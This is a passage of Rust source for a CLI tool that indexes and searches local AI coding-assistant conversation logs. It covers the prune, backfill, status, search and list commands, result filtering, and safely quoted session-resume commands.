/// Remove claude-mem observer sessions that earlier versions indexed.
///
/// Deliberately a command rather than a schema migration: migrations run inside the
/// detached indexer that `search` spawns, so a destructive one would fire silently on the
/// first search after upgrading, before anyone could take a backup.
fn cmd_prune_observer(dry_run: bool, assume_yes: bool) -> Result<()> {
    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, false)?;

    if dry_run {
        // One scan for both numbers; see survey_observer_sessions.
        let (count, sample) = indexer.survey_observer_sessions(20)?;
        eprintln!(
            "Would remove {} claude-mem observer session(s) and rebuild the full-text index.",
            count
        );
        for s in sample {
            eprintln!(
                "  {}  {}  {}",
                s.first_message_at, s.session_id, s.project_path
            );
        }
        eprintln!("Re-run without --dry-run to apply.");
        return Ok(());
    }

    // The destructive path still counts up front: the confirmation prompt and the
    // zero-session short-circuit both need the number before anything is deleted.
    let count = indexer.count_observer_sessions()?;

    if count == 0 {
        eprintln!("No claude-mem observer sessions in the index.");
        // Still rebuild. Databases created before 0.15.0 carry index entries stranded by
        // the old delete trigger whether or not claude-mem was ever used, and this is the
        // only command that clears them.
        eprintln!("Rebuilding the full-text index to clear entries stranded by the pre-0.15.0 delete trigger.");
        indexer.rebuild_fts()?;
        eprintln!("\u{2713} Full-text index rebuilt.");
        return Ok(());
    }

    eprintln!(
        "Removing {} claude-mem observer session(s) and rebuilding the full-text index.",
        count
    );
    eprintln!("This runs once and can take several minutes on a large index.");
    eprintln!("Back up ~/.conversation-search/index.db first — this cannot be undone.");
    eprintln!(
        "The observations themselves stay in claude-mem's own database; only this index changes."
    );

    let stdin = std::io::stdin();
    let is_terminal = std::io::IsTerminal::is_terminal(&stdin);
    if !confirm_prune(count, assume_yes, is_terminal, &mut stdin.lock())? {
        eprintln!("Aborted. Nothing was removed.");
        return Ok(());
    }

    let removed = match indexer.prune_observer_sessions() {
        Ok(n) => n,
        Err(e) => {
            eprintln!("Prune failed: {}", e);
            eprintln!("Nothing was removed — the whole operation runs in one transaction and rolled back.");
            eprintln!("If another ai-conversation-search process is indexing, wait for it to finish and re-run.");
            return Err(e);
        }
    };

    eprintln!("\u{2713} Removed {} observer session(s).", removed);
    // The file does not shrink -- freed pages are reused instead. Saying so up front
    // avoids a "nothing happened" reading of an unchanged file size.
    eprintln!("Database file size is unchanged; the freed space is reused by future indexing.");
    Ok(())
}

fn cmd_backfill_bigram(dry_run: bool) -> Result<()> {
    // init_schema first: on a pre-10 database this creates the bigram table
    // and repairs the triggers (recording migration 10), so the fill below
    // sees the post-migration shape. It also registers `bigram_analyze`,
    // which the fill statement calls. Drain first, or queued rows count as
    // missing and get analyzed twice.
    let conn = db::connect(db::DEFAULT_DB_PATH, false)?;
    crate::schema::init_schema(&conn)?;
    crate::schema::drain_bigram_pending(&conn)?;

    let missing = crate::schema::count_bigram_missing(&conn)?;
    if dry_run {
        eprintln!(
            "{} message(s) lack a bigram index entry. Re-run without --dry-run to fill them.",
            missing
        );
        return Ok(());
    }
    if missing == 0 {
        eprintln!("Bigram index is complete. Nothing to do.");
        return Ok(());
    }
    let filled = crate::schema::fill_bigram_missing(&conn)?;
    eprintln!(
        "\u{2713} Filled {} bigram index entr{}.",
        filled,
        if filled == 1 { "y" } else { "ies" }
    );
    Ok(())
}

fn cmd_status(json_output: bool) -> Result<()> {
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    let files_on_disk = count_conversation_files_on_disk();
    let status = search.get_index_status(files_on_disk)?;

    let log_path = db::expand_path(BACKGROUND_LOG_PATH);
    let log = std::fs::read_to_string(&log_path).unwrap_or_default();
    let background = last_background_failures(&log);

    if json_output {
        let mut json_val = serde_json::to_value(&status)?;
        json_val["background_index_failures"] = match &background {
            Some((run, failures)) => serde_json::json!({
                "log": log_path.display().to_string(),
                "run": run.trim_start_matches(BACKGROUND_LOG_HEADER).trim(),
                "lines": failures,
            }),
            None => serde_json::Value::Null,
        };
        let localized = localize_timestamps(json_val);
        println!("{}", serde_json::to_string_pretty(&localized)?);
        return Ok(());
    }

    println!("Index Status");
    println!("{}", "=".repeat(40));

    let db_path = db::expand_path(db::DEFAULT_DB_PATH);
    let size_mb = status.db_size_bytes as f64 / (1024.0 * 1024.0);
    println!("Database: {} ({:.1} MB)", db_path.display(), size_mb);
    println!(
        "FTS health: {}",
        if status.fts_healthy {
            "OK"
        } else {
            "CORRUPTED"
        }
    );

    println!("\nSessions: {} total", status.total_conversations);
    for sc in &status.by_source {
        println!("  {}: {}", sc.source, sc.count);
    }

    println!("\nMessages: {} total", status.total_messages);
    println!("Orphan conversation rows: {}", status.orphan_conversations);
    if status.orphan_conversations > 0 {
        eprintln!(
            "  \u{26a0} {} conversation row(s) have metadata but no indexed messages. Run 'ai-conversation-search index --all' to repair them.",
            status.orphan_conversations
        );
    }

    if let (Some(ref earliest), Some(ref latest)) =
        (&status.earliest_conversation, &status.latest_conversation)
    {
        let earliest_local = format_timestamp(earliest, true, false);
        let latest_local = format_timestamp(latest, true, false);
        println!("Coverage: {} ~ {}", earliest_local, latest_local);
    } else {
        println!("Coverage: (no data)");
    }

    if !status.by_repo.is_empty() {
        println!("\nTop repositories:");
        for rc in &status.by_repo {
            println!("  {} ({} sessions)", rc.repo_root, rc.count);
        }
    }

    println!(
        "\nIndexed files: {} / {} on disk",
        status.indexed_files, status.files_on_disk
    );
    let unindexed = status.files_on_disk as i64 - status.indexed_files;
    if unindexed > 0 {
        eprintln!("  \u{26a0} {} files not indexed. Run 'ai-conversation-search index --all' to include them.", unindexed);
    }

    if let Some((run, failures)) = background {
        eprintln!(
            "\n\u{26a0} The last background index ({}) reported {} failure(s), e.g.: {}\n  Full log: {}",
            run.trim_start_matches(BACKGROUND_LOG_HEADER).trim(),
            failures.len(),
            failures[0].trim(),
            log_path.display()
        );
    }

    Ok(())
}

/// Warn on stderr when `--limit` dropped matches.
///
/// Unconditional, not gated on --verbose: a caller who never sees this line reads a
/// capped list as the complete answer, which is how "not found" gets confused with
/// "not looked for". stderr keeps stdout's JSON contract intact.
fn print_truncation_notice(truncated: bool, shown: usize, unit: &str) {
    if truncated {
        // "may exist": the FTS path reports truncation when candidates were left
        // unscanned, and those can still all fail the filters.
        eprintln!(
            "Note: showing first {} {} (more matches may exist). Raise with --limit.",
            shown, unit
        );
    }
}

fn print_unindexed_warning(search: &ConversationSearch) {
    let files_on_disk = count_conversation_files_on_disk();
    match search.count_indexed_files() {
        Ok(indexed) => {
            let unindexed = files_on_disk as i64 - indexed;
            if unindexed > 0 {
                eprintln!("\u{26a0} {} conversation files not indexed. Run 'ai-conversation-search index --all' to include them.", unindexed);
            }
        }
        Err(e) => {
            eprintln!("Warning: could not check index status: {}", e);
        }
    }
}

/// Build the `cd … && claude --resume …` one-liner, or `None` if it cannot be made safe.
///
/// `cd --` terminates option parsing: a project directory named `-Users-foo` is all
/// "safe" characters, so it passes `shell_quote` through untouched, and quoting would not
/// help anyway -- `cd '-Users-foo'` is still `-Users-foo` after quote removal, which `cd`
/// reads as flags. `session_id` gets no such treatment because whether `claude --resume`
/// accepts a `--` separator is that CLI's business, not ours; a leading `-` there is
/// refused instead of guessed at. Real session ids are UUIDs, so this costs nothing.
fn build_resume_command(project_path: &str, session_id: &str, cmd: &str) -> Option<String> {
    if !is_shell_safe_value(project_path) || !is_shell_safe_value(session_id) {
        return None;
    }
    if session_id.starts_with('-') {
        return None;
    }
    Some(format!(
        "cd -- {} && {} --resume {}",
        shell_quote(project_path),
        cmd,
        shell_quote(session_id)
    ))
}

fn inject_resume_command(val: &mut serde_json::Value) {
    let cmd = claude_cmd();
    match val {
        serde_json::Value::Array(arr) => {
            for item in arr.iter_mut() {
                inject_resume_command(item);
            }
        }
        // Only inject into objects that have session_id (i.e., result rows)
        serde_json::Value::Object(map) if map.contains_key("session_id") => {
            let source = map
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("claude_code")
                .to_string();
            let session_id = map
                .get("session_id")
                .and_then(|v| v.as_str())
                .map(String::from);
            let project_path = map
                .get("project_path")
                .and_then(|v| v.as_str())
                .map(String::from);

            let resume = match (session_id, project_path) {
                (Some(sid), Some(pp)) => match source.as_str() {
                    "opencode" | "codex" => serde_json::Value::Null,
                    _ => build_resume_command(&pp, &sid, &cmd)
                        .map(serde_json::Value::String)
                        .unwrap_or(serde_json::Value::Null),
                },
                _ => serde_json::Value::Null,
            };
            map.insert("resume_command".to_string(), resume);
        }
        _ => {}
    }
}

/// Partial-match exclusion against an optional path column.
///
/// Empty patterns never match; `None` is never excluded. ASCII
/// case-insensitive, mirroring SQLite `LIKE` for the paths this filters
/// (`project_path`, `repo_root`). No normalization (no trailing-slash
/// stripping, no `~` expansion) — patterns match the stored string as-is.
fn matches_exclude(value: Option<&str>, excludes: &[String]) -> bool {
    let Some(v) = value else {
        return false;
    };
    let lower = v.to_ascii_lowercase();
    excludes
        .iter()
        .any(|e| !e.is_empty() && lower.contains(&e.to_ascii_lowercase()))
}

/// Partial-match exclusion on the session's working directory (`project_path`).
/// Owned by the `list-enrich` plan; `last` reuses it.
pub fn matches_exclude_project(project_path: Option<&str>, excludes: &[String]) -> bool {
    matches_exclude(project_path, excludes)
}

/// Partial-match exclusion on the git-common repository root (`repo_root`).
/// Owned by the `list-enrich` plan; `last` reuses it.
pub fn matches_exclude_repo(repo_root: Option<&str>, excludes: &[String]) -> bool {
    matches_exclude(repo_root, excludes)
}

/// Last path segment for display (`pick` shows this column already).
///
/// `Path::file_name`, not a `/` split: trailing slashes resolve to the real
/// segment and multibyte boundaries cannot panic. `None` when there is no
/// path, no segment (`..`, empty), or non-UTF8 content.
pub fn project_basename(project_path: Option<&str>) -> Option<String> {
    project_path.and_then(|p| {
        std::path::Path::new(p)
            .file_name()?
            .to_str()
            .map(String::from)
            .filter(|s| !s.is_empty())
    })
}

/// `--here` predicate: the session started at or under the invoking shell's
/// directory. Separator-boundary prefix, so cwd `/a/b` keeps `/a/b/c` but
/// not the sibling `/a/bc`. `None` (unknown `project_path`) never matches.
pub fn matches_here(project_path: Option<&str>, cwd: &str) -> bool {
    let Some(pp) = project_path else {
        return false;
    };
    let cwd = cwd.trim_end_matches('/');
    if cwd.is_empty() {
        // Invoker is at the filesystem root: every absolute path is under it.
        return pp.starts_with('/');
    }
    pp == cwd || pp.starts_with(&format!("{}/", cwd))
}

/// Rust-side narrowing shared by `search`/`list`: partial-match excludes plus
/// `--here`. SQL is untouched (`SearchFilter` carries the exact-match
/// `--project`/`--repo`/`--source`/date scope); this runs per fetch round.
#[derive(Default)]
struct PostFilter {
    exclude_project: Vec<String>,
    exclude_repo: Vec<String>,
    /// Canonicalized invoker cwd (`--here`), or `None` when off.
    here: Option<String>,
}

impl PostFilter {
    fn active(&self) -> bool {
        !self.exclude_project.is_empty() || !self.exclude_repo.is_empty() || self.here.is_some()
    }

    fn current_dir() -> Option<String> {
        std::env::current_dir()
            .ok()
            .map(|p| p.to_string_lossy().trim_end_matches('/').to_string())
    }
}

/// Whether one row survives the post-filter. `repo_root` comes from
/// `ConversationRow` on the `list` path and from
/// `repo_roots_for_sessions` on the `search` paths.
fn row_kept(project_path: Option<&str>, repo_root: Option<&str>, post: &PostFilter) -> bool {
    if matches_exclude_project(project_path, &post.exclude_project) {
        return false;
    }
    if matches_exclude_repo(repo_root, &post.exclude_repo) {
        return false;
    }
    if let Some(cwd) = post.here.as_deref() {
        if !matches_here(project_path, cwd) {
            return false;
        }
    }
    true
}

/// Re-run the query with a growing `LIMIT` until `requested` rows survive the
/// post-filter or the corpus is exhausted.
///
/// Ordering is stable across rounds (each round is a longer prefix of the
/// same order), so filtering the longest prefix is equivalent to filtering
/// everything and taking the head. `truncated` errs toward `true` while more
/// rows may exist, and is exact once the tail is reached. The fetch cap keeps
/// an exclude-everything pattern from scanning the whole index.
///
/// `fetch` returns its rows, whether more rows exist beyond them, and a
/// per-round context for `keep` (the `search` paths resolve `repo_root` per
/// round; `list` rows already carry it, so it passes `()`).
fn fetch_filling<T: Clone, C>(
    requested: i64,
    mut fetch: impl FnMut(i64) -> Result<(Vec<T>, bool, C)>,
    keep: impl Fn(&T, &C) -> bool,
) -> Result<(Vec<T>, bool)> {
    /// Hard stop for the growth loop below.
    const MAX_FETCH: i64 = 1000;
    /// At most this many queries per command. One FTS round over a large
    /// index costs seconds, so an unbounded doubling loop turns a broad query
    /// with a narrow filter (`search "the" --here`) into minutes. Three rounds
    /// fill the common cases; beyond that return partial + `truncated: true`.
    const MAX_ROUNDS: u32 = 3;
    if requested <= 0 {
        let (rows, truncated, ctx) = fetch(1)?;
        let kept: Vec<T> = rows.iter().filter(|r| keep(r, &ctx)).cloned().collect();
        let excluded_any = kept.len() != rows.len();
        return Ok((Vec::new(), truncated || excluded_any));
    }
    let mut fetch_limit = requested.saturating_add(1).max(1);
    let mut rounds: u32 = 0;
    loop {
        rounds += 1;
        let (rows, underlying_truncated, ctx) = fetch(fetch_limit)?;
        let kept: Vec<T> = rows.iter().filter(|r| keep(r, &ctx)).cloned().collect();
        if kept.len() as i64 > requested {
            let mut out = kept;
            out.truncate(requested as usize);
            return Ok((out, true));
        }
        if !underlying_truncated || fetch_limit >= MAX_FETCH || rounds >= MAX_ROUNDS {
            // Exhausted (exact), or capped (conservative: more may exist).
            let truncated = underlying_truncated;
            return Ok((kept, truncated));
        }
        fetch_limit = (fetch_limit.saturating_mul(4).saturating_add(1)).min(MAX_FETCH);
    }
}

/// Suffix for human output when the session's directory is gone.
fn missing_marker(project_path: Option<&str>) -> &'static str {
    match project_path {
        Some(p) if !std::path::Path::new(p).exists() => " (missing)",
        _ => "",
    }
}

fn inject_project_fields(val: &mut serde_json::Value) {
    match val {
        serde_json::Value::Array(arr) => {
            for item in arr.iter_mut() {
                inject_project_fields(item);
            }
        }
        // Same session-bearing-object rule as `inject_resume_command`.
        serde_json::Value::Object(map) if map.contains_key("session_id") => {
            let project_path = map
                .get("project_path")
                .and_then(|v| v.as_str())
                .map(String::from);
            let exists = project_path
                .as_deref()
                .map(|p| std::path::Path::new(p).exists());
            map.insert(
                "project_exists".to_string(),
                match exists {
                    Some(b) => serde_json::Value::Bool(b),
                    None => serde_json::Value::Null,
                },
            );
            map.insert(
                "project_basename".to_string(),
                match project_basename(project_path.as_deref()) {
                    Some(b) => serde_json::Value::String(b),
                    None => serde_json::Value::Null,
                },
            );
        }
        _ => {}
    }
}

/// Render a stored summary, or a placeholder when there is nothing to show.
///
/// Whitespace-only counts as nothing: it would otherwise print as a blank line, which
/// reads as a rendering bug rather than a missing title. The indexers reject blanks on the
/// way in, but stored rows are not revisited unless the transcript changes, so the guard
/// is needed here too. Covers `search`, `search --group-by-session` and `list` at once.
fn display_summary(summary: Option<&str>) -> &str {
    match summary {
        Some(s) if !s.trim().is_empty() => {
            // First non-blank line only. These rows are one line each, with a suffix after
            // the summary (`(N matches)`, message counts), and an embedded newline pushes
            // that suffix onto its own line and makes the row ungreppable. Slash-command
            // transcripts carry multi-line summaries routinely.
            s.lines().find(|l| !l.trim().is_empty()).unwrap_or(s)
        }
        _ => "[no summary]",
    }
}

/// Truncate to `max` characters, reporting whether anything was dropped.
///
/// `chars()`, not bytes: the corpus is largely Japanese and a byte slice would panic on a
/// multibyte boundary. The bool is returned rather than left to the caller to infer from
/// the length, because an unconditional ellipsis claims a complete message was cut short.
fn truncate_chars(s: &str, max: usize) -> (String, bool) {
    let out: String = s.chars().take(max).collect();
    let dropped = s.chars().nth(max).is_some();
    (out, dropped)
}

fn cmd_search(
    query: &str,
    filter: &SearchFilter<'_>,
    post: &PostFilter,
    show_content: bool,
    content_chars: usize,
    verbose: bool,
    group_by_session: bool,
    active_only: bool,
    json_output: bool,
) -> Result<()> {
    maybe_background_index();
    let mut search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;

    if group_by_session {
        return cmd_search_grouped(
            &mut search,
            query,
            filter,
            post,
            show_content,
            content_chars,
            verbose,
            active_only,
            json_output,
        );
    }

    // Rust-side excludes/--here narrow each fetched prefix; refetch with a
    // growing LIMIT so `--limit N` still returns N surviving rows.
    // `--active-only` joins that same refetch loop so the limit still fills
    // after rewound hits are dropped.
    let (results, truncated, stats) = if post.active() || active_only {
        let mut last_stats = None;
        let (rows, trunc) = fetch_filling(
            filter.limit,
            |fetch_limit| {
                let f = SearchFilter {
                    limit: fetch_limit,
                    ..*filter
                };
                let r = search.search_conversations(query, &f)?;
                let ids: Vec<String> = r.rows.iter().map(|row| row.session_id.clone()).collect();
                let roots = search.repo_roots_for_sessions(&ids)?;
                let truncated = r.stats.truncated;
                last_stats = Some(r.stats);
                Ok((r.rows, truncated, roots))
            },
            |row: &SearchResultRow, roots: &HashMap<String, Option<String>>| {
                if active_only && row.is_abandoned {
                    return false;
                }
                let repo = roots.get(&row.session_id).and_then(|o| o.as_deref());
                row_kept(row.project_path.as_deref(), repo, post)
            },
        )?;
        let stats = last_stats.expect("fetch_filling queries at least once");
        (rows, trunc, stats)
    } else {
        let r = search.search_conversations(query, filter)?;
        let truncated = r.stats.truncated;
        (r.rows, truncated, r.stats)
    };

    if json_output {
        print_json_envelope(
            &results,
            truncated,
            show_content.then_some((&search, content_chars)),
        )?;
        // Also on stderr: a human piping stdout into jq never sees the envelope's
        // `truncated`, so the line still has a reader.
        print_truncation_notice(truncated, results.len(), "results");
        if verbose {
            eprintln!(
                "Scanned {} sessions ({} messages), {} matched",
                stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
            );
            print_unindexed_warning(&search);
        }
        return Ok(());
    }

    if results.is_empty() {
        println!("No results found for: {}", query);
        // Before the diagnostics, because an empty list produced by `--limit 0` still has
        // matches behind it and "No results found" reads as their absence.
        print_truncation_notice(truncated, results.len(), "results");
        eprintln!(
            "Scanned {} sessions ({} messages), 0 matched",
            stats.sessions_in_scope, stats.total_indexed_messages
        );
        print_unindexed_warning(&search);
        return Ok(());
    }

    if verbose {
        eprintln!(
            "Scanned {} sessions ({} messages), {} matched",
            stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
        );
        print_unindexed_warning(&search);
    }

    print_truncation_notice(truncated, results.len(), "results");

    println!(
        "\u{1f50d} Found {} matches for '{}':\n",
        results.len(),
        query
    );

    for result in &results {
        let icon = if result.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        let timestamp = format_timestamp(&result.timestamp, true, false);
        let source_str = result.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);

        let project_dir = result.project_path.as_deref().unwrap_or("");
        let summary = display_summary(result.conversation_summary.as_deref());
        let session_id = &result.session_id;
        let message_uuid = &result.message_uuid;

        println!("{} {} {}", icon, label, summary);
        println!("   Session: {}", session_id);
        println!(
            "   Project: {}{}",
            project_dir,
            missing_marker(result.project_path.as_deref())
        );
        println!("   Time: {}", timestamp);
        if result.is_abandoned {
            println!("   Note: [rewound] off the current path, kept for search");
        }
        if let Some(m) = result
            .model
            .as_deref()
            .or(result.conversation_model.as_deref())
        {
            println!("   Model: {}", m);
        }
        println!("   Message: {}", message_uuid);

        if show_content {
            if let Some(content) = search.get_full_message_content(message_uuid) {
                let (text, dropped) = truncate_chars(&content, content_chars);
                println!("\n   {}{}", text, if dropped { "…" } else { "" });
            }
        } else {
            println!("\n   {}", result.context_snippet);
        }

        if source_str == "opencode" {
            println!(
                "\n   OpenCode session: {}",
                session_id.strip_prefix("oc:").unwrap_or(session_id)
            );
        } else if source_str == "codex" {
            println!(
                "\n   Codex session: {}",
                session_id.strip_prefix("codex:").unwrap_or(session_id)
            );
        } else {
            println!("\n   Resume:");
            println!("     cd -- {}", shell_quote(project_dir));
            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
        }
        println!();
    }

    Ok(())
}

fn cmd_search_grouped(
    search: &mut ConversationSearch,
    query: &str,
    filter: &SearchFilter<'_>,
    post: &PostFilter,
    show_content: bool,
    content_chars: usize,
    verbose: bool,
    active_only: bool,
    json_output: bool,
) -> Result<()> {
    let (rows, truncated, stats) = if post.active() || active_only {
        let mut last_stats = None;
        let (rows, trunc) = fetch_filling(
            filter.limit,
            |fetch_limit| {
                let f = SearchFilter {
                    limit: fetch_limit,
                    ..*filter
                };
                let r = search.search_grouped_by_session(query, &f)?;
                let ids: Vec<String> = r
                    .rows
                    .iter()
                    .map(|g| g.representative.session_id.clone())
                    .collect();
                let roots = search.repo_roots_for_sessions(&ids)?;
                let truncated = r.stats.truncated;
                last_stats = Some(r.stats);
                Ok((r.rows, truncated, roots))
            },
            |grouped: &GroupedRow, roots: &HashMap<String, Option<String>>| {
                if active_only && grouped.representative.is_abandoned {
                    return false;
                }
                let r = &grouped.representative;
                let repo = roots.get(&r.session_id).and_then(|o| o.as_deref());
                row_kept(r.project_path.as_deref(), repo, post)
            },
        )?;
        let stats = last_stats.expect("fetch_filling queries at least once");
        (rows, trunc, stats)
    } else {
        let r = search.search_grouped_by_session(query, filter)?;
        let truncated = r.stats.truncated;
        (r.rows, truncated, r.stats)
    };
    let result_rows = rows;

    if json_output {
        print_json_envelope(
            &result_rows,
            truncated,
            show_content.then_some((&*search, content_chars)),
        )?;
        print_truncation_notice(truncated, result_rows.len(), "sessions");
        if verbose {
            eprintln!(
                "Scanned {} sessions ({} messages), {} matched",
                stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
            );
            print_unindexed_warning(search);
        }
        return Ok(());
    }

    if result_rows.is_empty() {
        println!("No results found for: {}", query);
        print_truncation_notice(truncated, result_rows.len(), "sessions");
        eprintln!(
            "Scanned {} sessions ({} messages), 0 matched",
            stats.sessions_in_scope, stats.total_indexed_messages
        );
        print_unindexed_warning(search);
        return Ok(());
    }

    if verbose {
        eprintln!(
            "Scanned {} sessions ({} messages), {} matched",
            stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
        );
        print_unindexed_warning(search);
    }

    print_truncation_notice(truncated, result_rows.len(), "sessions");

    println!(
        "\u{1f50d} Found {} sessions matching '{}':\n",
        result_rows.len(),
        query
    );

    for grouped in &result_rows {
        let r = &grouped.representative;
        let source_str = r.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);
        let summary = display_summary(r.conversation_summary.as_deref());
        let project_dir = r.project_path.as_deref().unwrap_or("");
        let session_id = &r.session_id;
        let timestamp = format_timestamp(&r.timestamp, true, false);

        println!("{} {} ({} matches)", label, summary, grouped.match_count);
        println!("   Session: {}", session_id);
        println!(
            "   Project: {}{}",
            project_dir,
            missing_marker(r.project_path.as_deref())
        );
        println!("   Time: {}", timestamp);
        if r.is_abandoned {
            println!("   Note: [rewound] off the current path, kept for search");
        }
        if let Some(m) = r.model.as_deref().or(r.conversation_model.as_deref()) {
            println!("   Model: {}", m);
        }

        if show_content {
            if let Some(content) = search.get_full_message_content(&r.message_uuid) {
                let (text, dropped) = truncate_chars(&content, content_chars);
                println!("\n   {}{}", text, if dropped { "…" } else { "" });
            }
        } else {
            println!("\n   {}", r.context_snippet);
        }

        if source_str != "opencode" && source_str != "codex" {
            println!("\n   Resume:");
            println!("     cd -- {}", shell_quote(project_dir));
            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
        }
        println!();
    }

    Ok(())
}

fn cmd_context(uuid: &str, depth: i32, show_content: bool, json_output: bool) -> Result<()> {
    maybe_background_index();
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    let result = search.get_conversation_context(uuid, depth)?;

    if json_output {
        let json_val = serde_json::to_value(&result)?;
        let localized = localize_timestamps(json_val);
        println!("{}", serde_json::to_string_pretty(&localized)?);
        return Ok(());
    }

    println!("Context for message: {}\n", uuid);

    if let Some(ref err) = result.error {
        println!("Error: {}", err);
        return Ok(());
    }

    // Show ancestors
    if !result.ancestors.is_empty() {
        println!("\u{1f4dc} Parent messages:");
        for msg in &result.ancestors {
            let icon = if msg.message_type == "user" {
                "\u{1f464}"
            } else {
                "\u{1f916}"
            };
            let summary = msg.summary.as_deref().unwrap_or("No summary");
            println!("  {} {}", icon, summary);
        }
        println!();
    }

    // Show target
    if let Some(ref msg) = result.message {
        println!("\u{1f3af} Target message:");
        let icon = if msg.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        if show_content {
            println!("  {} {}", icon, msg.full_content);
        } else {
            let summary = msg.summary.as_deref().unwrap_or("No summary");
            println!("  {} {}", icon, summary);
        }
        if let Some(m) = msg.model.as_deref() {
            println!("  Model: {}", m);
        } else if let Some(ref conv) = result.conversation {
            if let Some(m) = conv.model.as_deref() {
                println!("  Session model: {}", m);
            }
        }
        println!();
    }

    Ok(())
}

fn cmd_list(filter: &SearchFilter<'_>, post: &PostFilter, json_output: bool) -> Result<()> {
    maybe_background_index();
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    // Same refill contract as `cmd_search`: Rust-side excludes/--here narrow
    // each fetched prefix, so grow LIMIT until `--limit N` is filled.
    // `ConversationRow` already carries `repo_root`, so no extra lookup.
    let (convs, truncated) = if post.active() {
        fetch_filling(
            filter.limit,
            |fetch_limit| {
                let f = SearchFilter {
                    limit: fetch_limit,
                    ..*filter
                };
                let r = search.list_recent_conversations(&f)?;
                Ok((r.rows, r.truncated, ()))
            },
            |conv: &ConversationRow, _: &()| {
                row_kept(
                    conv.project_path.as_deref(),
                    conv.repo_root.as_deref(),
                    post,
                )
            },
        )?
    } else {
        let r = search.list_recent_conversations(filter)?;
        (r.rows, r.truncated)
    };

    if json_output {
        // `list` rows are conversations, not messages -- there is no body to attach.
        print_json_envelope(&convs, truncated, None)?;
        print_truncation_notice(truncated, convs.len(), "conversations");
        return Ok(());
    }

    if convs.is_empty() {
        println!("No conversations found");
        // Before the reader concludes there is nothing here: `--limit 0` produces an empty
        // list that still has conversations behind it.
        print_truncation_notice(truncated, convs.len(), "conversations");
        return Ok(());
    }

    print_truncation_notice(truncated, convs.len(), "conversations");

    let display_days = filter.days_back.unwrap_or(7);
    println!("Recent conversations (last {} days):\n", display_days);

    for conv in &convs {
        let last_at = conv.last_message_at.as_deref().unwrap_or("");
        let timestamp = format_timestamp(last_at, true, false);
        let source_str = conv.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);
        let summary = display_summary(conv.conversation_summary.as_deref());
        let msg_count = conv.message_count;
        let project = conv.project_path.as_deref().unwrap_or("");

        println!("{} [{}] {}", label, timestamp, summary);
        println!("  {} messages", msg_count);
        if let Some(m) = conv.model.as_deref() {
            println!("  Model: {}", m);
        }
        println!(
            "  {}{}",
            project,
            missing_marker(conv.project_path.as_deref())
        );
        println!("  Session: {}", conv.session_id);
        println!();
    }

    Ok(())
}

/// Exit status for a tree result.
///
/// `error` means no tree came back: an unresolvable or ambiguous session id, but also a
/// session that resolved and whose transcript could not be read (`raw_tree_error`). A
/// script reading `$?` has to be able to tell any of those from a conversation that is
/// genuinely empty.
///
/// `warning` deliberately stays 0: it means partial data *was* returned, and a non-zero
/// exit would tell callers to throw away output they should be reading.
fn tree_exit_code(tree: &crate::search::ConversationTree) -> i32 {
    if tree.error.is_some() {
        1
    } else {
        0
    }
}

/// Replace a tree's error, keeping the rest. Turns the generic "not found" into a
/// description of what actually went wrong.
fn tree_with_error(
    tree: crate::search::ConversationTree,
    error: String,
) -> crate::search::ConversationTree {
    crate::search::ConversationTree {
        error: Some(error),
        ..tree
    }
}

/// Look up a session's tree, indexing its transcript on the spot if it is not in the index.
///
/// The retry is what makes "read the session that just ended" work without the user running
/// `index` by hand; `maybe_background_index` cannot cover it, being detached and debounced.
fn lookup_tree(
    db_path: &str,
    session_id: &str,
    project_roots: Option<&[std::path::PathBuf]>,
) -> Result<crate::search::ConversationTree> {
    let search = ConversationSearch::new(db_path)?;
    let tree = search.get_conversation_tree(session_id)?;

    // `conversation: None` alongside an error is exactly the two not-found shapes: an id
    // that would not resolve, and one that resolved to no conversation row. Reading the
    // struct rather than the error text keeps this independent of the message wording.
    // The raw-transcript fallbacks all keep `conversation: Some(..)`, so a session whose
    // file is merely unreadable never triggers a pointless re-index.
    if tree.conversation.is_some() || tree.error.is_none() {
        return Ok(tree);
    }

    // Released before the indexer opens the same database read-write.
    drop(search);
    match index_single_session(db_path, session_id, project_roots) {
        TargetedIndex::Handed => {
            let retried = ConversationSearch::new(db_path)?.get_conversation_tree(session_id)?;
            if retried.conversation.is_some() || retried.error.is_none() {
                return Ok(retried);
            }
            // The file exists and the indexer accepted it, yet nothing landed. The only
            // ways that happens are the deliberate skips -- claude-mem observer,
            // summarizer, empty transcript -- and each has a documented way in.
            Ok(tree_with_error(
                retried,
                format!(
                    "Session {} has a transcript on disk but is excluded from the index \
                     (claude-mem observer, summarizer, or an empty transcript). For an \
                     observer session, set CONVERSATION_SEARCH_INDEX_OBSERVER=1 and run \
                     `index --all --force`.",
                    session_id
                ),
            ))
        }
        TargetedIndex::AmbiguousPrefix(n) => Ok(tree_with_error(
            tree,
            format!(
                "Session id '{}' is not indexed and matches {} transcripts on disk. \
                 Pass more characters of the id.",
                session_id, n
            ),
        )),
        TargetedIndex::Failed(why) => Ok(tree_with_error(
            tree,
            format!(
                "Session {} is not indexed and could not be indexed now: {}. \
                 Run `ai-conversation-search index --all` once the cause is cleared.",
                session_id, why
            ),
        )),
        // Nothing to add: the id names no transcript at all, which is what the original
        // error already says.
        TargetedIndex::NotAClaudeCodeId | TargetedIndex::TranscriptNotFound => Ok(tree),
    }
}

/// Display-level tool noise, deliberately NOT `summarization::is_tool_noise`.
///
/// Why not reuse it: that predicate is tuned for search ranking, so it keeps `[Tool: X]`
/// bodies when they are short or carry enough surrounding prose. Here the whole point is to
/// drop them, matching the jq filter this replaces in the fzf preview. (The two agree on
/// `[Tool result]`, interrupts and empty bodies; `[Tool: X]` is where they part.)
fn is_tool_node(node: &TreeNode) -> bool {
    let body = node.full_content.trim_start();
